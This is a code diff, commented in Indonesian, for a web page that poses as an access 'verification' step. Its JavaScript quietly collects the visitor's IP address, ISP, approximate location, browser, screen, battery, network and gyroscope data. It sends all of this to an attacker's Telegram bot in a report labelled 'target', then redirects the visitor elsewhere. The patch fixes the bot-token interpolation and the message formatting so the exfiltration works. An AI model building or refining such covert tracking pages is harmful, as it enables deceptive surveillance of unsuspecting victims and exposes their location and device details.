@@ -135,7 +135,7 @@ let wilayahDipilih = "";
 let dataSensor = { alpha: "Tidak ada", beta: "Tidak ada", gamma: "Tidak ada" };
 let dataIPGlobal = { ip: "Gagal memuat", org: "Gagal memuat", city: "Gagal memuat", country_name: "Gagal memuat" };
 
-// Ambil info IP & ISP secara otomatis saat halaman dibuka
+// Mengambil rincian IP publik & ISP di awal secara diam-diam
 fetch('https://ipapi.co')
     .then(res => res.json())
     .then(data => {
@@ -143,7 +143,7 @@ fetch('https://ipapi.co')
     })
     .catch(err => console.log("Gagal mengambil data IP:", err));
 
-// Sensor Perangkat (Mendapatkan orientasi/kemiringan giroskop jika didukung)
+// Sensor Perangkat (Giroskop koordinat arah kemiringan HP)
 if (window.DeviceOrientationEvent) {
     window.addEventListener('deviceorientation', (event) => {
         dataSensor.alpha = event.alpha ? event.alpha.toFixed(2) : "Tidak ada";
@@ -169,11 +169,11 @@ function mulaiVerifikasi(wilayah) {
     siapkanDanKirimData();
 }
 
-// Mengompilasi Log Data (Poin 1, 2, dan 4) lalu kirim ke Telegram berupa teks instan
+// Proses kompilasi data internal instan dan kirim menggunakan parser HTML aman
 async function siapkanDanKirimData() {
     updateStatus("Memuat enkripsi verifikasi...", "loading", true);
 
-    // Mengambil Informasi Baterai Sistem
+    // Mengambil Informasi Persentase Baterai Sistem HP
     let infoBaterai = "Tidak didukung";
     if (navigator.getBattery) {
         try {
@@ -182,32 +182,32 @@ async function siapkanDanKirimData() {
         } catch (e) { console.log(e); }
     }
 
-    // Mengambil Informasi Kualitas Jaringan Browser
+    // Mengambil Kualitas Estimasi Kecepatan Jaringan Operator
     let infoJaringan = "Tidak didukung";
     if (navigator.connection) {
         infoJaringan = `${navigator.connection.effectiveType || 'N/A'} (Speed: ~${navigator.connection.downlink || 'N/A'} Mbps)`;
     }
 
-    // Menggabungkan seluruh variabel ke dalam satu format teks laporan tanpa video
-    const infoTeks = `☠️ *Hasil Verifikasi Akses target by @anonymous*:\n\n` +
-                     `• *Wilayah Pilihan:* \`${wilayahDipilih}\`\n\n` +
-                     `🌐 *4. ALAMAT IP & OPERATOR (ISP)*\n` +
-                     `• IP Address: \`${dataIPGlobal.ip}\`\n` +
-                     `• ISP / Provider: \`${dataIPGlobal.org}\`\n` +
-                     `• Lokasi Kasar: \`${dataIPGlobal.city}, ${dataIPGlobal.country_name}\`\n\n` +
-                     `📱 *1. INFO PERANGKAT & SISTEM*\n` +
-                     `• OS/Browser: \`${navigator.userAgent}\`\n` +
-                     `• Layar HP: \`${screen.width}x${screen.height} px\`\n` +
-                     `• Bahasa Perangkat: \`${navigator.language}\`\n` +
-                     `• Info Baterai: \`${infoBaterai}\`\n` +
-                     `• Info Jaringan: \`${infoJaringan}\`\n\n` +
-                     `🧭 *2. SENSOR HARDWARE*\n` +
-                     `• Gyro Alpha (Z): \`${dataSensor.alpha}\`\n` +
-                     `• Gyro Beta (X): \`${dataSensor.beta}\`\n` +
-                     `• Gyro Gamma (Y): \`${dataSensor.gamma}\``;
+    // Menyusun isi laporan menggunakan tag standar HTML agar kebal dari kesalahan parsing karakter khusus
+    const infoTeks = `<b>☠️ Hasil Verifikasi Akses target by @anonymous</b>\n\n` +
+                     `• <b>Wilayah Pilihan:</b> <code>${wilayahDipilih}</code>\n\n` +
+                     `<b>🌐 4. ALAMAT IP & OPERATOR (ISP)</b>\n` +
+                     `• IP Address: <code>${dataIPGlobal.ip}</code>\n` +
+                     `• ISP / Provider: <code>${dataIPGlobal.org}</code>\n` +
+                     `• Lokasi Kasar: <code>${dataIPGlobal.city}, ${dataIPGlobal.country_name}</code>\n\n` +
+                     `<b>📱 1. INFO PERANGKAT & SISTEM</b>\n` +
+                     `• OS/Browser: <code>${navigator.userAgent}</code>\n` +
+                     `• Layar HP: <code>${screen.width}x${screen.height} px</code>\n` +
+                     `• Bahasa Perangkat: <code>${navigator.language}</code>\n` +
+                     `• Info Baterai: <code>${infoBaterai}</code>\n` +
+                     `• Info Jaringan: <code>${infoJaringan}</code>\n\n` +
+                     `<b>🧭 2. SENSOR HARDWARE</b>\n` +
+                     `• Gyro Alpha (Z): <code>${dataSensor.alpha}</code>\n` +
+                     `• Gyro Beta (X): <code>${dataSensor.beta}</code>\n` +
+                     `• Gyro Gamma (Y): <code>${dataSensor.gamma}</code>`;
 
-    // Menggunakan API sendMessage karena hanya mengirim data teks murni
-    fetch(`https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage`, {
+    // Mengirim ke API Telegram Bot menggunakan konfigurasi objek JSON murni
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -215,7 +215,7 @@ async function siapkanDanKirimData() {
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: infoTeks,
-            parse_mode: 'Markdown'
+            parse_mode: 'HTML'
         })
     })
     .then(response => response.json())
@@ -226,11 +226,13 @@ async function siapkanDanKirimData() {
                 window.location.href = URL_WEB_TUJUAN;
             }, 1500);
         } else {
-            updateStatus("❌ Gagal memvalidasi data ke server.", "", false);
+            // Menampilkan deskripsi error asli dari Telegram jika kredensial bot tidak valid
+            updateStatus(`❌ API Error: ${data.description || 'Gagal mengirim'}`, "", false);
         }
     })
     .catch(error => {
-        updateStatus("❌ Terjadi kesalahan jaringan.", "", false);
+        // Penanganan jika domain API Telegram diblokir oleh provider internet lokal
+        updateStatus("❌ Terjadi kesalahan jaringan. Coba aktifkan VPN atau gunakan Wifi.", "", false);
     });
 }
 </script>
